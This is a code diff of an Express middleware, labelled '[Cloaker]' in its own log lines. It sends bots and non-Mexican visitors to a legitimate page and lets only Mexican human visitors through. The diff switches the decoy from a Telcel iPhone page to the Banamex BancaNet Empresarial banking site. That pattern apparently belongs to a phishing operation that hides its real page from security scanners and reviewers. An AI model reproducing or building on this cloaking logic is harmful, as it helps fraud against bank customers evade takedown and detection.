@@ -119,20 +119,20 @@ app.use((req, res, next) => {
     
     const isBot = botPatterns.some(pattern => pattern.test(userAgent));
 
-    // Si es un bot, redirigir a Telcel
+    // Si es un bot, redirigir a BancaNet Empresarial
     if (isBot) {
       console.log(`[Cloaker] Bot detectado: ${userAgent.substring(0, 50)} - IP: ${clientIp}`);
-      return res.redirect('https://www.telcel.com/iphone');
+      return res.redirect('https://www.bancanetempresarial.banamex.com.mx/bestbanking/spanishdir/bankmain.htm');
     }
 
     // Obtener información de geolocalización
     const geo = geoip.lookup(clientIp);
     
-    // Si no se puede determinar la ubicación O no es de México, redirigir a Telcel
+    // Si no se puede determinar la ubicación O no es de México, redirigir a BancaNet Empresarial
     if (!geo || geo.country !== 'MX') {
       const country = geo?.country || 'Desconocido';
       console.log(`[Cloaker] IP no mexicana detectada: ${clientIp} (${country})`);
-      return res.redirect('https://www.telcel.com/iphone');
+      return res.redirect('https://www.bancanetempresarial.banamex.com.mx/bestbanking/spanishdir/bankmain.htm');
     }
 
     // Si es de México y no es bot, permitir acceso
